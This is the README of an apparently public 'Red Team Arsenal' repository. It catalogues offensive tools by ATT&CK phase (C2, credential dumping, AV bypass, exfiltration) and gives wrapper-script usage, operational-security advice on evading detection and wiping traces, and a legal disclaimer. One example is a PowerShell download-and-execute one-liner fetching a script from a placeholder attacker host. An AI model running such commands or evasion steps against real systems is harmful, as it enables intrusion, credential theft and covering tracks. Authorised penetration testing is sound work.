# 🎯 Red Team Arsenal

<div align="center">

![Version](https://img.shields.io/badge/version-1.0.0-red.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Kali%20%7C%20ParrotOS-blue.svg)
![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)
![Maintenance](https://img.shields.io/badge/maintained-yes-brightgreen.svg)
![Security](https://img.shields.io/badge/security-offensive-red.svg)

**A comprehensive offensive security toolkit for professional red team operations**

[Features](#-features) • [Installation](#-installation) • [Tools](#-tools) • [Usage](#-usage) • [Documentation](#-documentation)

</div>

---

## 🌟 Overview

Red Team Arsenal is a curated collection of the most effective offensive security tools, scripts, and payloads used by professional penetration testers and red team operators. This repository consolidates cutting-edge tools for reconnaissance, exploitation, post-exploitation, and persistence into a single, well-organized framework.

### 🎖️ Why This Arsenal?

- 🔥 **Curated Selection** - Only battle-tested, actively maintained tools
- 📦 **One-Stop Shop** - Everything you need in one repository
- 🚀 **Quick Deployment** - Automated setup scripts
- 📚 **Comprehensive Docs** - Detailed usage guides and examples
- 🔄 **Regular Updates** - Tools updated monthly
- 🎯 **Real-World Focus** - Techniques used in actual engagements
- 🛡️ **OpSec Aware** - Built-in operational security considerations

---

## 🎯 Features

### Core Capabilities

| Category | Tools | Description |
|----------|-------|-------------|
| **Reconnaissance** | 15+ tools | Network scanning, OSINT, subdomain enumeration |
| **Initial Access** | 20+ tools | Phishing, exploitation, password attacks |
| **Execution** | 10+ tools | Command execution, scripting frameworks |
| **Persistence** | 8+ tools | Backdoors, scheduled tasks, registry manipulation |
| **Privilege Escalation** | 12+ tools | Linux/Windows privesc, kernel exploits |
| **Defense Evasion** | 15+ tools | AV bypass, obfuscation, process injection |
| **Credential Access** | 10+ tools | Password dumping, hash cracking, token theft |
| **Discovery** | 8+ tools | Network mapping, AD enumeration |
| **Lateral Movement** | 10+ tools | Pass-the-hash, RDP, WMI, PSExec |
| **Collection** | 6+ tools | Data exfiltration, screenshot capture |
| **Command & Control** | 8+ tools | C2 frameworks, covert channels |
| **Exfiltration** | 5+ tools | Data staging and transfer |

---

## 📦 Installation

### Quick Start

```bash
# Clone the repository
git clone https://github.com/Panda1847/red-team-arsenal.git
cd red-team-arsenal

# Run automated setup
chmod +x scripts/setup.sh
./scripts/setup.sh

# Verify installation
./scripts/verify.sh
```

### Manual Installation

```bash
# Install dependencies
sudo apt update
sudo apt install -y python3 python3-pip git curl wget

# Install Python requirements
pip3 install -r requirements.txt

# Install individual tools
./scripts/install_tools.sh
```

### Docker Installation

```bash
# Build Docker image
docker build -t red-team-arsenal .

# Run container
docker run -it --rm red-team-arsenal
```

---

## 🛠️ Tools Included

### 🔍 Reconnaissance & OSINT

#### Network Scanning
- **Nmap** - Network discovery and security auditing
- **Masscan** - Fast port scanner
- **RustScan** - Modern port scanner (10x faster than Nmap)
- **Angry IP Scanner** - Fast network scanner

#### Subdomain Enumeration
- **Subfinder** - Passive subdomain discovery
- **Amass** - In-depth attack surface mapping
- **Assetfinder** - Find domains and subdomains
- **Sublist3r** - Fast subdomains enumeration

#### Web Reconnaissance
- **WhatWeb** - Web scanner
- **Wappalyzer CLI** - Technology detection
- **Waybackurls** - Fetch URLs from Wayback Machine
- **Httprobe** - Probe for working HTTP/HTTPS servers

#### OSINT
- **theHarvester** - E-mail, subdomain, and people names harvester
- **Recon-ng** - Full-featured reconnaissance framework
- **Sherlock** - Hunt down social media accounts
- **SpiderFoot** - Automated OSINT collection

### 🎯 Initial Access

#### Exploitation Frameworks
- **Metasploit Framework** - Penetration testing platform
- **Cobalt Strike** (commercial) - Adversary simulation
- **Empire** - PowerShell post-exploitation agent
- **Covenant** - .NET C2 framework

#### Web Exploitation
- **SQLMap** - Automatic SQL injection
- **XSStrike** - Advanced XSS detection
- **Commix** - Command injection exploitation
- **NoSQLMap** - NoSQL injection tool

#### Password Attacks
- **Hydra** - Network login cracker
- **Medusa** - Fast parallel password cracker
- **CrackMapExec** - Swiss army knife for pentesting networks
- **Spray** - Password spraying tool

#### Phishing
- **Gophish** - Phishing campaign framework
- **Social-Engineer Toolkit (SET)** - Social engineering toolkit
- **Evilginx2** - Man-in-the-middle attack framework
- **Modlishka** - Reverse proxy for phishing

### 💻 Execution & Post-Exploitation

#### Command & Control
- **Sliver** - Open-source C2 framework
- **Havoc** - Modern C2 framework
- **Mythic** - Collaborative red teaming platform
- **PoshC2** - PowerShell C2 framework
- **Merlin** - Cross-platform post-exploitation HTTP/2 C2
- **Covenant** - .NET C2 framework
- **Koadic** - Windows post-exploitation rootkit
- **Pupy** - Cross-platform RAT

#### Shells & Backdoors
- **Netcat** - Swiss army knife of networking
- **Socat** - Multipurpose relay
- **Weevely** - PHP web shell
- **Meterpreter** - Advanced payload

### 🔓 Privilege Escalation

#### Linux PrivEsc
- **LinPEAS** - Linux privilege escalation script
- **LinEnum** - Linux enumeration script
- **Linux Exploit Suggester** - Kernel exploit suggester
- **GTFOBins** - Unix binaries exploitation

#### Windows PrivEsc
- **WinPEAS** - Windows privilege escalation script
- **PowerUp** - PowerShell privilege escalation
- **Seatbelt** - Security-oriented host survey
- **SharpUp** - C# port of PowerUp
- **Watson** - Windows privilege escalation enumeration

### 🎭 Defense Evasion

#### AV Bypass
- **Veil** - Generate AV-evading payloads
- **Shellter** - Dynamic shellcode injection
- **Invoke-Obfuscation** - PowerShell obfuscator
- **Donut** - Shellcode generation framework
- **ScareCrow** - Payload creation framework

#### Process Injection
- **Process Hacker** - Process viewer and manipulation
- **Reflective DLL Injection** - Inject DLLs without LoadLibrary
- **Process Hollowing** - Code injection technique

### 🔑 Credential Access

#### Password Dumping
- **Mimikatz** - Extract credentials from memory
- **LaZagne** - Retrieve passwords stored on local computer
- **SharpDPAPI** - DPAPI abuse
- **Rubeus** - Kerberos abuse toolkit
- **Impacket** - Network protocol toolkit

#### Hash Cracking
- **Hashcat** - Advanced password recovery
- **John the Ripper** - Password cracker
- **Hydra** - Network login cracker

### 🗺️ Discovery & Lateral Movement

#### Active Directory
- **BloodHound** - AD relationship mapper
- **PowerView** - AD enumeration
- **ADRecon** - AD reconnaissance tool
- **PingCastle** - AD security assessment

#### Lateral Movement
- **PsExec** - Execute processes remotely
- **WMIExec** - WMI-based lateral movement
- **Evil-WinRM** - WinRM shell
- **CrackMapExec** - Network exploitation tool

### 📊 Collection & Exfiltration

#### Data Collection
- **LaZagne** - Password recovery tool
- **SessionGopher** - Extract saved sessions
- **SharpChrome** - Chrome data extraction
- **KeeThief** - KeePass extraction

#### Exfiltration
- **DNSExfiltrator** - Data exfiltration over DNS
- **PyExfil** - Data exfiltration framework
- **Cloakify** - Data exfiltration via text-based steganography

---

## 🚀 Usage

### Quick Reference

```bash
# Setup environment
./scripts/setup.sh

# Run reconnaissance
./scripts/recon.sh target.com

# Launch C2 server
./scripts/c2/start_sliver.sh

# Generate payloads
./scripts/payloads/generate.sh --type windows --format exe

# Run privilege escalation checks
./scripts/privesc/linux_check.sh
./scripts/privesc/windows_check.sh

# Credential dumping
./scripts/creds/dump_all.sh

# Lateral movement
./scripts/lateral/psexec.sh target.local
```

### Detailed Examples

#### Example 1: Full Network Reconnaissance

```bash
# Run comprehensive recon
./tools/recon/full_recon.sh example.com

# This will:
# 1. Subdomain enumeration
# 2. Port scanning
# 3. Service detection
# 4. Web technology detection
# 5. OSINT gathering
# 6. Generate report
```

#### Example 2: Active Directory Enumeration

```bash
# Run BloodHound collection
./tools/ad/bloodhound_collect.sh domain.local username password

# Analyze with BloodHound GUI
neo4j start
./tools/ad/bloodhound_gui.sh
```

#### Example 3: Deploy C2 Infrastructure

```bash
# Start Sliver C2
./scripts/c2/sliver/start.sh

# Generate implant
./scripts/c2/sliver/generate.sh --os windows --arch x64 --format exe

# Start listener
./scripts/c2/sliver/listen.sh --port 443 --protocol https
```

#### Example 4: Privilege Escalation

```bash
# Linux
./tools/privesc/linpeas.sh | tee linpeas_output.txt

# Windows (from compromised host)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/winpeas.ps1')"
```

---

## 📚 Documentation

Comprehensive documentation available in the `docs/` directory:

| Document | Description |
|----------|-------------|
| [SETUP.md](docs/SETUP.md) | Detailed installation guide |
| [TOOLS.md](docs/TOOLS.md) | Complete tool reference |
| [TECHNIQUES.md](docs/TECHNIQUES.md) | Attack techniques and methodologies |
| [PLAYBOOKS.md](docs/PLAYBOOKS.md) | Step-by-step engagement playbooks |
| [OPSEC.md](docs/OPSEC.md) | Operational security guidelines |
| [EVASION.md](docs/EVASION.md) | Defense evasion techniques |
| [CHEATSHEET.md](docs/CHEATSHEET.md) | Quick reference commands |
| [FAQ.md](docs/FAQ.md) | Frequently asked questions |

---

## 🎓 Attack Methodology

This arsenal follows the **MITRE ATT&CK Framework**:

```
1. Reconnaissance → 2. Initial Access → 3. Execution
                ↓
4. Persistence ← 5. Privilege Escalation ← 6. Defense Evasion
                ↓
7. Credential Access → 8. Discovery → 9. Lateral Movement
                ↓
10. Collection → 11. Command & Control → 12. Exfiltration
```

Each phase has dedicated tools and scripts in the arsenal.

---

## 🔒 Operational Security (OpSec)

### Best Practices

- 🔐 **Use VPNs/Proxies** - Route traffic through multiple hops
- 🎭 **Rotate Infrastructure** - Change C2 servers regularly
- 🔄 **Obfuscate Payloads** - Always obfuscate before deployment
- 🚫 **Avoid Detection** - Use living-off-the-land techniques
- 📝 **Clean Artifacts** - Remove logs and traces
- ⏰ **Timing** - Blend in with normal business hours
- 🎯 **Targeted Approach** - Avoid noisy scans

### Evasion Techniques

- **AV Evasion** - Use Veil, Shellter, or custom obfuscation
- **EDR Bypass** - Process injection, PPID spoofing
- **Network Evasion** - Domain fronting, DNS tunneling
- **Behavioral Evasion** - Sleep obfuscation, jitter

---

## ⚠️ Legal Disclaimer

**IMPORTANT:** This toolkit is provided for **authorized security testing and educational purposes only**.

### Legal Use Only

- ✅ Use only on systems you own or have explicit written permission to test
- ✅ Obtain proper authorization before any engagement
- ✅ Follow responsible disclosure practices
- ✅ Comply with all applicable laws and regulations
- ❌ **DO NOT** use for unauthorized access
- ❌ **DO NOT** use for illegal activities
- ❌ **DO NOT** use for malicious purposes

**Unauthorized access to computer systems is illegal.** Users are solely responsible for ensuring their use of these tools complies with all applicable laws.

---

## 🛡️ Defensive Countermeasures

Understanding attacks helps defenders. This section documents detection methods:

### Detection Signatures

- **Network IOCs** - C2 traffic patterns
- **Host IOCs** - Suspicious processes, registry keys
- **Behavioral IOCs** - Unusual authentication patterns

### Mitigation Strategies

- Implement EDR solutions
- Enable PowerShell logging
- Use application whitelisting
- Deploy network segmentation
- Implement least privilege
- Enable MFA everywhere

See [DEFENSE.md](docs/DEFENSE.md) for detailed countermeasures.

---

## 🔄 Updates & Maintenance

### Update Schedule

- **Tools:** Updated monthly
- **Payloads:** Updated weekly
- **Documentation:** Updated as needed

### Update Commands

```bash
# Update arsenal
git pull origin main

# Update tools
./scripts/update_tools.sh

# Update dependencies
pip3 install -r requirements.txt --upgrade
```

---

## 🤝 Contributing

Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Ways to Contribute

- 🔧 Add new tools
- 📝 Improve documentation
- 🐛 Report bugs
- 💡 Suggest features
- 🎯 Share techniques
- 📊 Add playbooks

---

## 📜 License

This project is licensed under the MIT License - see [LICENSE](LICENSE) for details.

### Third-Party Tools

All included tools retain their original licenses. See individual tool documentation for licensing information.

---

## 🙏 Acknowledgments

- **MITRE ATT&CK** - Framework and methodology
- **Offensive Security** - Training and techniques
- **Tool Authors** - All the amazing tool creators
- **Security Community** - Knowledge sharing and collaboration

---

## 📞 Support

- 📖 [Documentation](docs/)
- 🐛 [Issue Tracker](https://github.com/Panda1847/red-team-arsenal/issues)
- 💬 [Discussions](https://github.com/Panda1847/red-team-arsenal/discussions)

---

## 🗺️ Roadmap

### Version 1.1 (Planned)
- [ ] Automated payload generation
- [ ] Custom C2 profiles
- [ ] Docker-based lab environment
- [ ] Video tutorials
- [ ] Mobile pentesting tools

### Version 2.0 (Future)
- [ ] Web-based management interface
- [ ] Automated reporting
- [ ] Integration with SIEM
- [ ] Cloud pentesting tools
- [ ] Container escape techniques

---

## 📊 Statistics

![Tools](https://img.shields.io/badge/tools-100%2B-blue.svg)
![Scripts](https://img.shields.io/badge/scripts-50%2B-green.svg)
![Payloads](https://img.shields.io/badge/payloads-30%2B-red.svg)
![Documentation](https://img.shields.io/badge/docs-comprehensive-brightgreen.svg)

---

<div align="center">

**⚔️ Built for Red Teams, by Red Teams ⚔️**

**Use Responsibly. Test Legally. Hack Ethically.**

[⬆ Back to Top](#-red-team-arsenal)

</div>
